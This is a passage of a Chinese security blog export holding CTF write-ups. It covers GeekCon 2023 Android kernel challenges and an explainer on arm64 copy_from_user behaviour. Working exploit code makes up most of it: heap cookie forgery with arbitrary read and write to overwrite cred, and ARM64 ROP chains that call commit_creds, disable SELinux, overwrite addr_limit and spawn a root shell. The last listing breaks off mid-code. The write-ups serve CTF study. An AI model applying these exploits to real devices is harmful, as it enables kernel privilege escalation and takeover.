len, 7);\n}\n\nvoid aar(unsigned long k_addr, void* u_addr, unsigned long len){\n    unsigned long gst1_idx_7 = k_addr;\n    edit_buffer(&gst1_idx_7, 8, 5);\n    show_buffer(u_addr, len, 7);\n}\n\n#define TASK_COMM_OFFSET 0x750\n#define TASK_TASKS_OFFSET 0x488\n#define TASK_CRED_OFFSET 0x740\n\nunsigned long get_exp_task(){\n    unsigned long init_task = 0xFFFFFFC011953E00;\n    unsigned long exp_task_addr = 0x0;\n    unsigned long task_now = init_task;\n    unsigned long temp_val[2] = {0x0};\n\n    int i = 0;\n    while( (exp_task_addr == 0)){\n        aar(task_now+TASK_TASKS_OFFSET+8, temp_val, 8);    // +8：反向查找更快。mem_section被改，太慢了free_pages会崩溃\n        task_now = temp_val[0]-TASK_TASKS_OFFSET;\n        printf(\"task_struct: 0x%lx\\n\",task_now);\n        if(task_now == init_task){\n            printf(\"[X] failed to find target task_struct!\\n\");\n            break;\n        }\n\n        aar(task_now+TASK_COMM_OFFSET, temp_val, 0x10);\n        printf(\"task_struct->comm: %s\\n\", temp_val);\n        if( !strcmp(temp_val, \"exp\") ){\n        // if( (temp_val[0] & 0xffffff)==0x00707865){\n            exp_task_addr = task_now;\n            printf(\"find the task! task_struct: 0x%lx\\n\", task_now);\n        }\n        printf(\"\\n\");\n    }\n\n    return exp_task_addr;\n}\n\n\nint main(){\n/* prepare */\n    int i,j,k;\n    int fd;\n\n    unsigned long leak_buf[20];\n    memset(leak_buf,0x0,20*8);\n\n    for(i=0; i<4; i++) new_buffer(i);\n    for(i=0; i<4; i++) del_buffer(i);\n\n    if((fd = open(\"/dev/ptmx\", O_RDONLY)) == -1) err(1,\"open /dev/ptmx\");\n\n    for(int i=0; i<4; i++) show_buffer(&leak_buf[i], 8, i);\n\n    int use_idx = 2;\n    unsigned long gst1_off_7 = 0xffffffc011a4dfb0;   // 0xffffffc011a4dfb0, let fake heap's first 8 bytes be 0\n    unsigned long heap_addr = leak_buf[use_idx]-0x60;\n    // printf(\"heap_addr: 0x%lx, bswap_64(heap_addr): 0x%lx \\n\", heap_addr, bswap_64(heap_addr));\n    unsigned long fake_cookie = bswap_64(heap_addr)^gst1_off_7;\n\n    close(fd);\n\n    edit_buffer(&fake_cookie, 8, use_idx);\n    new_buffer(4);\n    new_buffer(5);\n\n    /* delete an object, and let it be the last one*/\n    del_buffer(use_idx);\n    unsigned long zero_flag = 0x0;\n    fake_cookie = bswap_64(heap_addr)^zero_flag;\n    edit_buffer(&fake_cookie, 8, use_idx);     \n\n    /* aaw/aar */\n    printf(\"set mem_section_addr\\n\");\n    // unsigned long mem_section_addr = 0xFFFFFFC011A7A8A8;\n    // unsigned long mem_section_data = 0x0;\n    aar(mem_section_addr, &mem_section_data, 8);\n    aaw(mem_section_addr, &zero_flag, 8);\n\n    printf(\"finding task_struct\\n\");\n    unsigned long task_addr = get_exp_task();\n    unsigned long cred_addr = 0x0;\n    aar(task_addr+TASK_CRED_OFFSET, &cred_addr, 8);\n    printf(\"cred addr: 0x%lx\\n\",cred_addr);\n\n    char buf[0x20];\n    memset(buf,0x0,0x20);\n    aaw(cred_addr, (void*)buf, 0x20);          // write exp's cred\n\n    printf(\"set mem_section_addr\\n\");\n    aaw(mem_section_addr, &mem_section_data, 8);\n\n    printf(\"get root shell\\n\");\n    system(\"/system/bin/sh\");\n\n    printf(\"exiting\\n\");\n    return 0;\n}\n```\n\n\n\n\n\n","tags":["kernel pwn","android"],"categories":["GeekCon 2023"]},{"title":"arm64 linux内核中memcpy是如何运作的？","url":"/2023/09/08/230908-arm64-memcpy-template/","content":"\n\n\n\n\n起因：做某个内核漏洞利用时，需要控制 copy_from_user() 的返回值为类似 0x7e 这种数，于是想当然构造了如下用户态代码\n\n```c\nchar* buf = mmap(0x60000000, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_SHARED | MAP_ANONYMOUS, -1, 0);\nchar* write_buffer = buf + (0x1000-0x180);\nint write_size = 0x180+0x7e;\nk_stackof_write(write_buffer,write_size);        \n// 对应到内核态会执行copy_from_user(k_addr,write_buffer,write_size);\n```\n\n按理说，内核态会有0x7e个字节拷贝失败，copy_from_user()的返回值应当为0x7e。然而，调试发现copy_from_user()的返回值为0xae（`0xae-0x7e=0x30`）。试了0x63，返回值是0x93（`0x93-0x63=0x30`），试了0x23，返回值是0x23（符合预期）。\n\n很奇怪的现象，为什么返回值会出现跟预期不一样的情况？copy_from_user()底层实际拷贝时究竟是怎么做的呢？\n\n涉及到一段汇编代码：[copy_template.S](https://elixir.bootlin.com/linux/v5.4.50/source/arch/arm64/lib/copy_template.S)\n\n以arm64架构、linux 5.4.50 为例，探索下内核中的拷贝过程是怎样的。以大于128字节的情况为例，主要的拷贝逻辑在 `Lcpy_body_large` 中。\n\n```armasm\n/* SPDX-License-Identifier: GPL-2.0-only */\n/*\n * Copyright (C) 2013 ARM Ltd.\n * Copyright (C) 2013 Linaro.\n *\n * This code is based on glibc cortex strings work originally authored by Linaro\n * be found @\n *\n * <http://bazaar.launchpad.net/~linaro-toolchain-dev/cortex-strings/trunk/>\n * files/head:/src/aarch64/\n */\n\n/*\n * Copy a buffer from src to dest (alignment handled by the hardware)\n *\n * Parameters:\n *\tx0 - dest\n *\tx1 - src\n *\tx2 - n\n * Returns:\n *\tx0 - dest\n */\ndstin\t.req\tx0\nsrc\t.req\tx1\ncount\t.req\tx2\ntmp1\t.req\tx3\ntmp1w\t.req\tw3\ntmp2\t.req\tx4\ntmp2w\t.req\tw4\ndst\t.req\tx6\n\nA_l\t.req\tx7\nA_h\t.req\tx8\nB_l\t.req\tx9\nB_h\t.req\tx10\nC_l\t.req\tx11\nC_h\t.req\tx12\nD_l\t.req\tx13\nD_h\t.req\tx14\n\n\tmov\tdst, dstin\n\tcmp\tcount, #16\n\t/*When memory length is less than 16, the accessed are not aligned.*/\n\tb.lo\t.Ltiny15          /*如果count小于16，就跳转到标号Ltiny15处执行*/\n\n\tneg\ttmp2, src           /*确定起始地址是否对齐*/\n\tands\ttmp2, tmp2, #15/* Bytes to reach alignment. */\n\tb.eq\t.LSrcAligned      /*若对齐，则跳转到LSrcAligned*/\n\tsub\tcount, count, tmp2\n\t/*\n\t* Copy the leading memory data from src to dst in an increasing\n\t* address order.By this way,the risk of overwriting the source\n\t* memory data is eliminated when the distance between src and\n\t* dst is less than 16. The memory accesses here are alignment.\n\t*/\n\ttbz\ttmp2, #0, 1f\n\tldrb1\ttmp1w, src, #1\n\tstrb1\ttmp1w, dst, #1\n1:\n\ttbz\ttmp2, #1, 2f\n\tldrh1\ttmp1w, src, #2\n\tstrh1\ttmp1w, dst, #2\n2:\n\ttbz\ttmp2, #2, 3f\n\tldr1\ttmp1w, src, #4\n\tstr1\ttmp1w, dst, #4\n3:\n\ttbz\ttmp2, #3, .LSrcAligned\n\tldr1\ttmp1, src, #8\n\tstr1\ttmp1, dst, #8\n\n.LSrcAligned:\n\tcmp\tcount, #64       \n\tb.ge\t.Lcpy_over64       /*若待拷贝的大小大于等于64，则跳转至Lcpy_over64*/\n\t/*\n\t* Deal with small copies quickly by dropping straight into the\n\t* exit block.\n\t*/\n.Ltail63:\n\t/*\n\t* Copy up to 48 bytes of data. At this point we only need the\n\t* bottom 6 bits of count to be accurate.\n\t*/\n\tands\ttmp1, count, #0x30\n\tb.eq\t.Ltiny15\n\tcmp\ttmp1w, #0x20\n\tb.eq\t1f\n\tb.lt\t2f\n\tldp1\tA_l, A_h, src, #16\n\tstp1\tA_l, A_h, dst, #16\n1:\n\tldp1\tA_l, A_h, src, #16\n\tstp1\tA_l, A_h, dst, #16\n2:\n\tldp1\tA_l, A_h, src, #16\n\tstp1\tA_l, A_h, dst, #16\n.Ltiny15:\n\t/*\n\t* Prefer to break one ldp/stp into several load/store to access\n\t* memory in an increasing address order,rather than to load/store 16\n\t* bytes from (src-16) to (dst-16) and to backward the src to aligned\n\t* address,which way is used in original cortex memcpy. If keeping\n\t* the original memcpy process here, memmove need to satisfy the\n\t* precondition that src address is at least 16 bytes bigger than dst\n\t* address,otherwise some source data will be overwritten when memove\n\t* call memcpy directly. To make memmove simpler and decouple the\n\t* memcpy's dependency on memmove, withdrew the original process.\n\t*/\n\ttbz\tcount, #3, 1f\n\tldr1\ttmp1, src, #8\n\tstr1\ttmp1, dst, #8\n1:\n\ttbz\tcount, #2, 2f\n\tldr1\ttmp1w, src, #4\n\tstr1\ttmp1w, dst, #4\n2:\n\ttbz\tcount, #1, 3f\n\tldrh1\ttmp1w, src, #2\n\tstrh1\ttmp1w, dst, #2\n3:\n\ttbz\tcount, #0, .Lexitfunc\n\tldrb1\ttmp1w, src, #1\n\tstrb1\ttmp1w, dst, #1\n\n\tb\t.Lexitfunc\n\n.Lcpy_over64:\n\tsubs\tcount, count, #128\n\tb.ge\t.Lcpy_body_large           /*若待拷贝的大小大于等于128，则跳转至Lcpy_body_large*/\n\t/*\n\t* Less than 128 bytes to copy, so handle 64 here and then jump\n\t* to the tail.\n\t*/\n\tldp1\tA_l, A_h, src, #16\n\tstp1\tA_l, A_h, dst, #16\n\tldp1\tB_l, B_h, src, #16\n\tldp1\tC_l, C_h, src, #16\n\tstp1\tB_l, B_h, dst, #16\n\tstp1\tC_l, C_h, dst, #16\n\tldp1\tD_l, D_h, src, #16\n\tstp1\tD_l, D_h, dst, #16\n\n\ttst\tcount, #0x3f\n\tb.ne\t.Ltail63\n\tb\t.Lexitfunc\n\n\t/*\n\t* Critical loop.  Start at a new cache line boundary.  Assuming\n\t* 64 bytes per line this ensures the entire loop is in one line.\n\t*/\n\t.p2align\tL1_CACHE_SHIFT\n.Lcpy_body_large:\n\t/* pre-get 64 bytes data. */\n\tldp1\tA_l, A_h, src, #16\n\tldp1\tB_l, B_h, src, #16\n\tldp1\tC_l, C_h, src, #16\n\tldp1\tD_l, D_h, src, #16             /*先将起始64字节内存加载到寄存器中*/\n1:\n\t/*\n\t* interlace the load of next 64 bytes data block with store of the last\n\t* loaded 64 bytes data.\n\t*/\n\tstp1\tA_l, A_h, dst, #16         /*将寄存器A中16字节内容存入目的地址*/\n\tldp1\tA_l, A_h, src, #16         /*从源地址中下一个64字节内容中，加载16字节到A寄存器*/\n\tstp1\tB_l, B_h, dst, #16         /*B C D寄存器依次重复A过程*/\n\tldp1\tB_l, B_h, src, #16\n\tstp1\tC_l, C_h, dst, #16\n\tldp1\tC_l, C_h, src, #16\n\tstp1\tD_l, D_h, dst, #16\n\tldp1\tD_l, D_h, src, #16        \n\tsubs\tcount, count, #64          /*待拷贝长度减去64字节，表示下一个循环将从源地址加载64字节内容，同时将上一次A B C D寄存器的内容（共64字节）存到目的地址中去*/\n\tb.ge\t1b                         /*count大于等于0的情况下，跳转到1处*/\n\tstp1\tA_l, A_h, dst, #16\n\tstp1\tB_l, B_h, dst, #16\n\tstp1\tC_l, C_h, dst, #16\n\tstp1\tD_l, D_h, dst, #16\n\n\ttst\tcount, #0x3f\n\tb.ne\t.Ltail63\n.Lexitfunc:\n```\n\nLcpy_body_large 中主要逻辑如下图示。64字节为一组，上一轮中，已将源地址（用户态）64字节内容分别加载到A（A_l/A_h）B（B_l/B_h）C（C_l/C_h）D（D_l/D_h）对应的8个寄存器中。此轮中：\n\n1. 先将A存到目的地址（内核态）\n2. 然后从下一个分组读取16个字节到A寄存器（此时完成16字节从源地址到目的地址的写入）\n3. 后面的 3 4 5 6 7 8 依次重复 1 2的操作，完成共64字节的拷贝\n\n![image-20230908172757504](./image-20230908172757504.png?size=600)\n\n理解汇编后，就能明白开头那段代码中为什么内核在 copy_from_user() 时返回值会出现 `0x93(0x63+0x30)` 和 `0x23(0x23+0)` 这两种情况。\n\n第一种情况：本质是需要访问未映射页面的size大于等于0x40\n\n假设左侧是已映射区域，右侧是未映射区域。那么当执行 2 时，内核访问未映射区域会进入错误页处理。此时存在寄存器B C D中的内容还未来的及写入目的地址中。于是未拷贝的长度实际是右侧未映射区域的大小（0x63），加上左侧B C D 寄存器中未写入的内容大小（0x30）。所以 copy_from_user() 返回未拷贝的长度是0x93。\n\n![image-20230908172831999](./image-20230908172831999.png?size=600)\n\n第二种情况：本质是需要访问未映射页面的size小于0x40\n\n剩余count小于0x40的情况下，不会再进入前面的循环拷贝过程，而是一次性将 A B C D 的内容写入目标地址，然后处理剩下的小于0x40的部分。访问这部分内容必然触发异常，于是未拷贝的长度就是未映射页面的size。\n\n第三种情况：左侧已映射部分不是0x40的整数倍\n\n前两种情况都是基于左侧已映射部分是0x40的整数倍为基础讨论的，假设左侧已映射部分是0x1b0，右侧是0x10。那么当执行到第8步时访问到非法内存，此时2 4 6步存到寄存器中的0x30字节内容未写入目的地址中，所以最终copy_from_user() 的返回值是 0x10+0x30=0x40。其他情况不枚举了。\n\n![image-20230908172857815](./image-20230908172857815.png?size=600)\n\n总之，copy_from_user() 函数出现返回值跟预期不一致的原因，是因为实际拷贝操作中，异常发生时，寄存器内容未来得及写入目标地址。寄存器中未写入目标地址的内容也会被纳入未拷贝长度中，这是用户态不容易感知到的部分。\n\n参考：\n\n[ARM64架构下memcpy实现原理](https://blog.csdn.net/m0_46250244/article/details/115055101)\n\n[ARM64-memcpy.S 汇编源码分析](https://codeantenna.com/a/GLeEH22cAA)\n\n","tags":["linux"],"categories":["未分类"]},{"title":"GeekCon AVSS 2023 Qualifier - kStackOverflow","url":"/2023/09/05/230905-kStackOverflow/","content":"\n\n![image-20230906145408644](image-20230906145408644.png)\n\n附件：[KV1.tar.gz](./KV1.tar.gz)\n\n# 漏洞分析\n\n说明文档中指出了漏洞点，在新创建的601号系统调用中，`stackof_write()` 和 `stackof_read()` 中使用了未检查的用户态参数 len，在拷贝内容时产生了越界读和越界写。\n\n```c\nnoinline long my_cfu(char *buffer, char __user * addr, unsigned long len) {\n    unsigned long l = len ^ 0xdeadbeefdeadbeef;\n    return copy_from_user(buffer,addr,l);\n}\nnoinline long my_ctu(char *buffer, char __user * addr, unsigned long len) {\n    unsigned long l = len ^ 0xdeadbeefdeadbeef;\n    return copy_to_user(addr,buffer,l);\n}\n\nnoinline long stackof_write(char __user * addr, unsigned long len) {\n    char buffer[0x100];\n    long ans;\n    memset(buffer, 0, sizeof(buffer));\n    ans=my_cfu(buffer,addr,len);\t\t\t// 越界写内核栈\n    return ans;\n}\nnoinline long stackof_read(char __user * addr, unsigned long len) {\n    char buffer[0x100];\n    long ans;\n    memset(buffer, 0, sizeof(buffer));\n    ans=my_ctu(buffer,addr,len);\t\t\t// 越界读内核栈\n    return ans;\n}\n\nnoinline long sys_stackof_handler(char __user * addr, unsigned long len, int option) {    \n    if(option){\n\t    return stackof_read(addr,len);\n    }\n    else{\n\t    return stackof_write(addr,len);\n    }\n}\n\nasmlinkage long sys_stackof(char __user *addr, unsigned long len,int option)\n// SYSCALL_DEFINE3(stackof, char __user * , addr, unsigned long,len ,int ,option)\n{\n    // printk(KERN_INFO \"In syscall stackof\\n\");\n    char buffer[0x800];\n    memset(buffer, 0, sizeof(buffer));\n    sprintf(buffer, \"option: %d\", option);\n    printk(KERN_INFO \"In syscall stackof. %s\\n\", buffer);\n    \n    return sys_stackof_handler(addr, len, option);\n}\n\n```\n\n\n\n# 漏洞利用\n\n- 利用 stackof_read() 函数的越界读，可以泄露任意长度的内核栈信息到用户态\n\n- 利用 stackof_write() 函数的越界写，可以写任意长度的信息到内核栈中\n\n\n\n## android 7\n\n> 内核版本：linux 3.10.0\n\n利用思路：\n\n1. 通过 stackof_read() 泄露内核栈地址（高地址）\n2. 通过 stackof_write() 将gadget布置到内核栈中，同时覆盖栈中的返回地址达成控制流劫持\n3. 系统开启PXN，无法ret2usr。所以利用rop将栈迁移到有gadget的栈空间（低地址）\n4. 继续rop，执行commit_creds(&init_cred) ，将 selinux_enforcing 处设置成0以关闭selinux\n5. 再次利用rop栈迁移，使上下文跟控制流劫持之前相同（x29，x30和sp），于是可成功返回用户态\n6. 在用户态拿root shell\n\n\n\n过程简记：\n\n首先，用stackof_write 成功控制返回地址，计算返回地址距离输入起始位置偏移0x108字节\n\n![image-20230906133222634](image-20230906133222634.png?size=600)\n\n系统开启PXN，无法直接ret2usr。但可以访问用户态数据，考虑两种方法：\n\n1. rop改 addr_limit\n2. rop执行 commit_cred(init_cred) 。【只能栈迁移到内核栈】\n\n为了回用户态后的操作简单点，选了第二种方式。\n\n要rop，就得栈迁移。\n\n既然要栈迁移，那么要保证迁移前后，sp和x29以及x30都是正常的状态，这样回到栈迁移的点就能正常返回到用户态。如下：\n\n在控制流劫持的点，原本应该ret 到 0xffffffc0000c3248， 栈地址是通过read泄露出来的偏移 0x100 的8个字节内容 。\n\n![image-20230906133422852](image-20230906133422852.png?size=600)\n\n所以，先将栈迁移到栈的低地址，执行完目标功能后，再设置好x29和x30的值，让其正常返回用户态。\n\n找到四条gadget，可以完成两次栈迁移，并顺利返回用户态：\n\n```c\nunsigned long gadget1 = 0xffffffc00009fc68;     // : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc0000da954;     // : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget3 = 0xffffffc0000cda00;     // :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret\nunsigned long gadget4 = 0xffffffc0000d6ae4;     // : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x80 ; ret\n```\n\n\n\n本地 root shell\n\n![image-20230906133540662](image-20230906133540662.png?size=600)\n\n\n\nexp如下：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xffffffc0000c3248\n\nunsigned long arg1, arg2;\n\nunsigned long init_cred_addr = 0xFFFFFFC0006A0D18;\nunsigned long commit_cred_func = 0xFFFFFFC0000C0E18+0x4;     // do not exec \"STP X29, X30, [SP,#var_30]!\"\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0006EBA0C;\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\nunsigned long gadget1 = 0xffffffc00009fc68;     // : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc0000da954;     // : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget3 = 0xffffffc0000cda00;     // :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret\nunsigned long gadget4 = 0xffffffc0000d6ae4;     // : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x80 ; ret\n\n\nint main(){\n\n    char* read_buf = malloc(0x200);\n    char* write_buf = malloc(0x200);\n    memset(read_buf, 0x0, 0x200);\n    memset(write_buf, 0x41, 0x100);\n\n    // char* test = \"aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaaf\";\n    // memcpy(write_buf,test,0x200);\n\n    k_stackof_read(read_buf, 0x200);\n    hexdump(read_buf, 0x200);\n    unsigned long real_k_sp = *((unsigned long*)&read_buf[0x100]);\n    printf(\"real_k_sp: 0x%lx\\n\",real_k_sp);\n\n\n    *((unsigned long *)&write_buf[0x100]) = real_k_sp - 0x110;         // kernel rop, fake kernel sp\n    *((unsigned long *)&write_buf[0x108]) = gadget1;         // gadget\n    \n    *((unsigned long *)&write_buf[8*0]) = real_k_sp - 0x110 + 0x10;   // ->x29\n    *((unsigned long *)&write_buf[8*1]) = gadget2;          // ->x30\n    *((unsigned long *)&write_buf[8*2]) = real_k_sp - 0x110 + 0x30;     //<-sp  ->x29\n    *((unsigned long *)&write_buf[8*3]) = commit_cred_func;          // ->x30\n    *((unsigned long *)&write_buf[8*4]) = init_cred_addr;\n    *((unsigned long *)&write_buf[8*5]) = 0x0;\n    *((unsigned long *)&write_buf[8*6]) = real_k_sp - 0x110 + 0x48;    // <- sp\n    *((unsigned long *)&write_buf[8*7]) = gadget2;\n    *((unsigned long *)&write_buf[8*8]) = 0x5;       \n    *((unsigned long *)&write_buf[8*9]) = 0x6;    \n    *((unsigned long *)&write_buf[8*10]) = 0x7;\n    *((unsigned long *)&write_buf[8*11]) = 0;        // set selinux value\n    *((unsigned long *)&write_buf[8*12]) = selinux_enforcing_addr - 0x14;   // selinux_enforcing addr\n    *((unsigned long *)&write_buf[8*13]) = gadget3;    // ->x30\n    *((unsigned long *)&write_buf[8*14]) = 0x11;\n    *((unsigned long *)&write_buf[8*15]) = 0x12;\n    *((unsigned long *)&write_buf[8*16]) = 0x13;\n    *((unsigned long *)&write_buf[8*17]) = gadget4;\n    *((unsigned long *)&write_buf[8*18]) = 0x15;\n    *((unsigned long *)&write_buf[8*19]) = 0x16;\n    *((unsigned long *)&write_buf[8*20]) = real_k_sp;\n    *((unsigned long *)&write_buf[8*21]) = KERNEL_RET;\n\n\n    hexdump(write_buf, 0x200);\n    k_stackof_write(write_buf,0x110);\n\n    system(\"/system/bin/sh\");\n\n    printf(\"exit\\n\");\n    return 0;\n}\n```\n\n\n\n## android 8\n\n> 内核版本：linux 3.18.94\n\n整体利用思路跟android 7一样，只不过这里没找到合适gadget，所以不再在内核中执行commit_creds()，而是先改addr_limit，然后回用户态通过pipe任意内核读写完成提权。\n\n利用思路：\n\n1. 通过 stackof_read() 泄露内核栈地址（高地址）\n2. 通过 stackof_write() 将gadget布置到内核栈中，同时覆盖栈中的返回地址达成控制流劫持\n3. 系统开启PXN，无法ret2usr。所以利用rop将栈迁移到有gadget的栈空间（低地址）\n4. 继续rop，执行一次任意地址写，将addr_limit写成X2中存储的一个很大的值\n5. 再次利用rop栈迁移，使上下文跟控制流劫持之前相同（x29，x30和sp），于是可成功返回用户态\n6. 在用户态通过pipe任意内核地址读写，改掉当前进程的cred，关闭selinux\n7. 在用户态拿root shell\n\n\n\n利用控制流劫持点，寄存器中的内容，降低rop gadget的复杂度：\n\n- x2的值是一个很大的值0xffffffffffffffd0，写addr_limit绰绰有余\n- x9 x10 x11等寄存器中的内容是用户态可控的\n\n![image-20230906135028344](image-20230906135028344.png?size=600)\n\n找的四条gadget如下，在内核态完成了一次任意地址写（将 thread_info->addr_limit 写成了X2的值0xffffffffffffffd0）\n\n```c\nunsigned long gadget1 = 0xffffffc0000a24e8;     //  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc00016fa4c;     //  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret\nunsigned long gadget3 = 0xffffffc0003dc88c;     //  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget4 = 0xffffffc0000deb98;     //  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret\n```\n\n写完addr_limit 后，返回用户态。先关闭selinux。再利用泄露的sp地址，计算 `thread_info->task` 并读出task地址。再根据task中 `task_struct->cred` 的偏移，读出cred所在地址。最后写cred，完成提权。\n\n本地 root shell：\n\n![image-20230906135208019](image-20230906135208019.png?size=600)\n\n\n\nexp如下：\n\n```c\n#define _GNU_SOURCE\n#include <pthread.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <netinet/ip.h>\n#include <sys/syscall.h>\n#include <sys/mman.h>\n#include <sys/uio.h>\n#include <sys/resource.h>\n#include <string.h>\n#include <fcntl.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <linux/net.h>\n#include <errno.h>\n#include <signal.h>\n\n#define SYS_STACKOF 601\n#define KERNEL_RET 0xFFFFFFC0000BF0B8 \n\nunsigned long arg1, arg2;\n\nunsigned long selinux_enforcing_addr = 0xFFFFFFC0009C74A4;\nunsigned long addr_limit_addr = 0;\n\n\n#ifndef HEXDUMP_COLS\n#define HEXDUMP_COLS 16\n#endif\n\nvoid hexdump(void *mem, unsigned int len) {\n    putchar('\\n');\n    for(int i = 0; i < len + ((len % HEXDUMP_COLS) ? (HEXDUMP_COLS - len % HEXDUMP_COLS) : 0); i++) {\n        /* print offset */\n        if(i % HEXDUMP_COLS == 0) {\n            printf(\"0x%06x: \", i);\n        }\n\n        /* print hex data */\n        if(i < len) {\n            printf(\"%02x \", 0xFF & ((char*)mem)[i]);\n        }\n        /* end of block, just aligning for ASCII dump */\n        else {        \n            printf(\"   \");\n        }\n\n        /* print ASCII dump */\n        if(i % HEXDUMP_COLS == (HEXDUMP_COLS - 1)) {\n            for(int j = i - (HEXDUMP_COLS - 1); j <= i; j++) {\n                 /* end of block, not really printing */\n                if(j >= len) {\n                    putchar(' ');\n                }\n                /* printable char */\n                else if(isprint(((char*)mem)[j])) {\n                    putchar(0xFF & ((char*)mem)[j]);\n                }\n                 /* other char */\n                else {\n                    putchar('.');\n                }\n            }\n            putchar('\\n');\n        }\n    }\n    putchar('\\n');\n}\n\nk_stackof_read(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_read - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 1);\n}\n\nk_stackof_write(void* addr, unsigned long len){\n    arg1 = addr;\n    arg2 = (len^0xdeadbeefdeadbeef);\n    printf(\"k_stackof_write - arg2: %lx\\n\",arg2);\n    syscall(SYS_STACKOF, arg1, arg2, 0);\n}\n\nunsigned long gadget1 = 0xffffffc0000a24e8;     //  : sub sp, x29, #0x10 ; mov w0, #0 ; ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x20 ; ret\nunsigned long gadget2 = 0xffffffc00016fa4c;     //  : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret\nunsigned long gadget3 = 0xffffffc0003dc88c;     //  : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget4 = 0xffffffc0000deb98;     //  : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret\n\n/*\n0xffffffc0000845d8 : ldp x19, x20, [sp, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\n0xffffffc0002ff46c : ldp x19, x21, [sp, #0x10] ; ldp x29, x30, [sp], #0x30 ; ret\n0xffffffc0000824d0 : ldp x21, x22, [sp, #0x20] ; ldp x29, x30, [sp], #0x30 ; ret\n0xffffffc00008ab08 : ldp x23, x24, [sp, #0x30] ; ldp x29, x30, [sp], #0x40 ; ret\n\n0xffffffc000350160 : ldp x29, x30, [sp], #0x20 ; ret\n\n\n0xffffffc00016fa4c : mov x0, x9 ; ldp x29, x30, [sp], #0x70 ; ret\n0xffffffc0003dc88c : str x2, [x0, #0x38] ; ldp x29, x30, [sp], #0x20 ; ret\n\n0xffffffc0000deb98 : ldp x29, x30, [sp, #0x10] ; add sp, sp, #0x70 ; ret\n\n\nunsigned long gadget2 = 0xffffffc0000da954;     // : ldp x0, x1, [x29, #0x10] ; ldp x29, x30, [sp], #0x20 ; ret\nunsigned long gadget3 = 0xffffffc0000cda00;     // :  : str w0, [x1, #0x14] ; ldp x29, x30, [sp], #0x10 ; ret\nunsigned long gadget4 = 0xffffffc0000d6ae4;     // : ldp x29, x30, [sp, #0x10] 